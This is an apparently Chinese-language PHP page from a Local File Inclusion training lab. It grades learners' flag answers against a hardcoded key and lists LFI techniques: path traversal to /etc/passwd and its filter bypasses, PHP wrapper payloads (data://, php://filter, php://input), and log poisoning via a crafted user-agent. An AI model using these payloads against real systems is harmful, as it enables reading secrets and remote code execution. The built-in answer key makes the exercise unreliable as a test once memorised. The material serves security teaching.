<?php


session_start();
if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: /account/login.php".(isset($_SERVER['REQUEST_URI'])?"?redirect=".$_SERVER['REQUEST_URI']:""));
    exit;
}

include("config.php");
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["answer"])) {
    $input_answer = $_POST["answer"];
    $user_id = $_SESSION["id"];
    if ($input_answer == "包含") {
        $challenges_name = "RCE-LFI-1";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "帳號") {
        $challenges_name = "RCE-LFI-2";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "mount") {
        $challenges_name = "RCE-LFI-3";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "根目錄") {
        $challenges_name = "RCE-LFI-4";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "../etc/passwd") {
        $challenges_name = "RCE-LFI-5";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "....//") {
        $challenges_name = "RCE-LFI-6";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "base64") {
        $challenges_name = "RCE-LFI-7";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else if ($input_answer == "/var/log/apache2/access.log") {
        $challenges_name = "RCE-LFI-8";
        include_once('../challenges.php');
        $challenge_array = CheckChallenges($link, $user_id, $challenges_name);
    } else {
        $challenge_array = array('alert', '答案錯誤');
    }
}
$challenge_type =  $challenge_array[0];
$challenge_messange =  $challenge_array[1];



?>


<?php
$titlename = 'Local File include';
include_once('../../php-inc/header.php');
?>





<h1>Local File include</h1>
<ul>
    <li>程式碼中引入有問題的函式，沒有過濾，導致敏感資料被「包含」在輸出
        <ul>
            <li><a href="include.php">include()</a>：引入的檔案如果不存在會噴警告但是會繼續執行</li>
            <li>include_once()：確保不會重複引入</li>
            <li><a href="require.php">require()</a>：引入的檔案如果不存在會噴警告且停止執行</li>
            <li>require_once()</li>
            <li>fopen()：開檔</li>
            <li>file_get_contents()：讀取檔案內容</li>
        </ul>
    </li>
    <li>常見參數：注意開檔以及有副檔名結尾的值（如.php等)
        <ul>
            <li>?cat={payload}</li>
            <li>?dir={payload}</li>
            <li>?action={payload}</li>
            <li>?board={payload}</li>
            <li>?date={payload}</li>
            <li>?detail={payload}</li>
            <li>?file={payload}</li>
            <li>?download={payload}</li>
            <li>?path={payload}</li>
            <li>?folder={payload}</li>
            <li>?prefix={payload}</li>
            <li>?include={payload}</li>
            <li>?page={payload}</li>
            <li>?inc={payload}</li>
            <li>?locate={payload}</li>
            <li>?show={payload}</li>
            <li>?doc={payload}</li>
            <li>?site={payload}</li>
            <li>?type={payload}</li>
            <li>?view={payload}</li>
            <li>?content={payload}</li>
            <li>?document={payload}</li>
            <li>?layout={payload}</li>
            <li>?mod={payload}</li>
            <li>?conf={payload}</li>
        </ul>
    </li>
    <li>特殊路徑
        <ul>
            <li>/etc/passwd LINUX 帳號資訊</li>
            <li>In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.</li>
        </ul>
    </li>
    <li>PHP Wrapper
    <ul>
        <li>包裝器</li>
        <li>file:// — Accessing local filesystem</li>
        <li>http:// — Accessing HTTP(s) URLs</li>
        <li>ftp:// — Accessing FTP(s) URLs</li>
        <li>php:// — Accessing various I/O streams</li>
        <li>zlib:// — Compression Streams</li>
        <li>data:// — Data (RFC 2397)</li>
        <li><a href="https://rcelab.feifei.tw/lfi/glob.php?file=glob:///var/www/html/*.php">glob://</a> — Find pathnames matching pattern</li>
        <li>phar:// — PHP Archive</li>
        <li>ssh2:// — Secure Shell 2</li>
        <li>rar:// — RAR</li>
        <li>ogg:// — Audio streams</li>
        <li>expect:// — Process Interaction Streams
    </ul>
        <ul>
            <li>data://text/plain,惡意指令
                <ul>
                    <li>需要開啟 allow_url_fopen ：on、allow_url_include：on</li>
                    <li><pre>data://text/plain,&lt;?php phpinfo()?&gt;</pre></li>
                    <li><pre>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</pre></li>
                </ul>
            </li>

            <li>php://filter
                <ul>
                    <li>(PHP 4.3.0) string.rot13: str_rot13() ，ROT13（迴轉13位)</li>
                    <li>(PHP 5.0.0) string.toupper: strtoupper()，轉成大寫</li>
                    <li>(PHP 5.0.0) string.tolower: strtolower() ，轉成小寫</li>
                    <li>(PHP 5.0.0) string.strip_tags: strip_tags() ，去除 html 與 PHP 標籤</li>
                </ul>
            </li>


            <li>https://rcelab.feifei.tw/lfi/index.php?url=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
            </li>
            <li>curl --data "惡意指令" https://rcelab.feifei.tw/lfi/index.php?url=php://input</li>
            </ul>
    </li>
    <li>特殊攻擊<ul>
            <li>/proc/self/environ 環境變數 + User Agent</li>
            <li>/proc/self/fd/ 環境變數 + referer</li>
        </ul>
    </li>
    <li>Log to rce 攻擊
        <ul>
            <li>curl --user-agent "惡意程式碼" https://rcelab.feifei.tw/</li>
        </ul>
    </li>
</ul>



<b>以下 LAB 請於最下面的 flag 欄位填入答案。</b><br>
<ul>
    <li><a href="https://rcelab.feifei.tw/lfi/index.php?url=hello.php">LAB 連結</a> 請問 LFI
        是因為引入函式後，檔案路徑沒有被過濾導致敏感資料被「_____」在輸出(**)</li>
    <li><a href="https://rcelab.feifei.tw/lfi/index.php?url=hello.php">LAB 連結</a> 透過 LFI 可以讀取敏感檔案，請問路徑 /etc/passwd
        可以取得使用者的什麼資訊(**)</li>
    <li><a href="https://rcelab.feifei.tw/lfi/index.php?url=hello.php">LAB 連結</a> 透過 LFI 可以讀取敏感檔案，請問路徑 /proc/1/mountinfo
        可以取得什麼資訊(*****)</li>
    <li><a href="https://rcelab.feifei.tw/lfi/index.php?url=hello.php">LAB 連結</a> 請問 ../../../../ 路徑穿越是為了回到哪一個地方呢(***)
    </li>
    <li><a href="https://rcelab.feifei.tw/lfi/index.php?url=hello.php">LAB 連結</a> 請問 %252e%252e%252fetc%252fpasswd 利用
        Double URL Encoded，其還原回來的文字為何？</li>
    <li><a href="https://rcelab.feifei.tw/lfi/l2.php?url=hello.php">LAB 連結</a>目標系統會過濾 ../ 該如何繞過？(******)</li>
    <li><a href="https://rcelab.feifei.tw/lfi/l3.php?url=hello.php">LAB 連結</a>請問
        php://filter/read=convert.base64-encode/resource=index，該偽協議是透過哪一個「編碼」進行編碼目標 index.php 呢？</li>
    <li><a href="https://rcelab.feifei.tw/lfi/l3.php?url=hello.php">LAB 連結</a>請問目標靶機的 apache 的 access log 路徑</li>
</ul>

<!-- ../../../../../../ / 根目錄 (不知道你在哪一個資料夾)
../../../../../etc/passwd
-> / 被過濾、被禁止 絕對路徑
-> 路徑穿越


....//....//....//etc/passwd
->
../../../etc/passwd

php://filter/convert.base64-encode/resource=index.php -->







<form method="POST" name="form" action="">
    <div class="input-group mb-3">
        <input id="answer" name="answer" type="text" class="form-control" placeholder="回答問題，請一次輸入一個答案" aria-label="回答問題" aria-describedby="basic-addon2">
        <div class="input-group-append">
            <button class="btn btn-primary  " type="submit">送出答案</button>
        </div>
    </div>
</form>


<?php
include_once('../../php-inc/footer.php');
?>